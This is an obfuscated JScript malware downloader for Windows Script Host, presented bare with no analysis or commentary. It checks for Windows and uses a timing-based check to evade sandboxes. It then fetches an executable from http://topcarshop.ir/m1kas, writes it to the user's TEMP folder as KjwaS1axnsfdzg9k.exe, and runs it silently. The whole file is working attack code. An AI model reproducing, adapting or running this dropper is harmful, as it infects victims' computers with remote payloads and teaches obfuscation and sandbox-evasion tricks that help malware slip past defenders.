var _W = false;
var _HM = "CreateObject";
var _NS = function _S() {return WScript[_HM]("WScript"+".Shell");}(), _H0 = 11;
var _DL = "MSXML2.XMLHTTP";
var _GS = 2123213;
var _FZ = 0;
function _OR(_WH){_NS["Run"](_WH, _FZ, _FZ);};
function _YZ(){return _DL + "";};
function _XZ(_RZ, _ML){_FZ = _FZ * 1; return _RZ - _ML;};
function _J(){return _HM;};
/*@cc_on
  @if (@_win32 || @_win64)
    _W = true;
  @end
@*/
if (_W)
{
var _WP = "";
function _Z(){return 22;};
var _PM = 0; var _A0 = 0;
function _C()
{
var _J0 = new this["Date"]();
var _A = _J0["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _J0 = new this["Date"]();
var _L0 = _J0["getUTCMilliseconds"]();
WScript["Sleep"](_Z());
var _J0 = new this["Date"]();
var _H = _J0["getUTCMilliseconds"]();
var _PM = "_R0";
_PM = _XZ(_L0, _A);
var _A0 = "_O";
_A0 = _XZ(_H, _L0);
_WP = "open";
return _XZ(_PM, _A0);
}
var _YM = false;
var _BG = false;
for (var _Z0 = _FZ; _Z0 < _Z() * 1; _Z0++){if (_C() != _FZ){
_YM = true; 
_A0 = "31" + 11 * _PM + _A0; 
_BG = true; 
break;
}}
function _R() {return ((_YM == true) && (_YM == _BG)) ? 1 : _FZ;};
if (_YM && _R() && _BG){
function _XD() {return _NS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KjwaS1axnsfdzg9k.ex" + "e";};
 _JS = _YZ();
 _ZV = WScript[_HM](_JS);
 var _KC = 1;
 while (_KC){
try {
	if (_KC == 1)
	{
		_ZV[_WP]("GET", "http://topcarshop.ir/m1kas", false);
		_ZV["send"]();
		_AQ = "Sleep";
	}
	WScript[_AQ](_Z() + 120); 
	if (_ZV["readystate"] < 2 * 2) continue;
	_KC = _FZ;
	function _GZ(_T) {var _L = (1, 2, 3, 4, 5, _T); return _L;};
	_EK = WScript[_J()]("ADODB.Stream");
	_JS = _EK;
	_JS[_WP]();
	_JS["type"] = _GZ(1);
	_JS["write"](_ZV["ResponseBody"]);
	_EK["position"] = _GZ(_FZ);
	_JS["Save" + "ToFile"](_XD(), 2);
	_EK["cl"+"ose"]();
	_IR = _XD();
	_OR(_IR);
} catch(_F){};
}
}
}

